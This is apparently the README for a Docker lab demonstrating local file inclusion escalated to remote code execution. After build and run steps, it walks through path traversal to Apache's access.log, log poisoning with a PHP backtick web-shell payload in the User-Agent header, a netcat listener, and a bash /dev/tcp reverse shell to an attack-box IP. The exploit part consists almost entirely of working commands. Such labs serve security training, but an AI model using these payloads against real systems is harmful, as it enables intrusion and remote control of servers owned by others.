# How to use

## Setup

### Build

```sh
docker build . -t lfi-rce-demo:v1.2
```

### Start container

```sh
docker run --rm -t -p 8086:80 lfi-rce-demo:v1.2
```

**Note**: Use `<CTRL+C>` to terminate

## Exploit

#### Use path traversal to display Apache logs: `/var/log/apache2/access.log`

```sh
curl http://localhost:8086/index.php?log=../../../../../var/log/apache2/access.log
```

#### Issue 1 request to the web app, setting the User Agent to the following:

```php
<?= `$_GET[0]` ?>
```

E.g.:

```sh
curl http://localhost:8086 -H 'User-Agent: <?= `$_GET[0]` ?>'
```

#### Create a listening instance of necat on your attack box

```sh
nc -vlp 4444
```

#### Check if you can execute shell commands on the victim box

E.g.:

```sh
curl 'http://localhost:8086/index.php?log=../../../../../var/log/apache2/access.log&0=ps+aux'
```

#### Create a reverse shell, using LoL approach

E.g.:

```sh
curl 'http://localhost:8086/index.php?log=../../../../../var/log/apache2/access.log&0=bash+-c+"sh+-i+%3e%26+/dev/tcp/192.168.1.5/4444+0%3e%261"'
```

#### Notes

- Replace `localhost` with the Docker daemon address (victim box).
- Replace `192.168.1.5` with your attack box IP address.
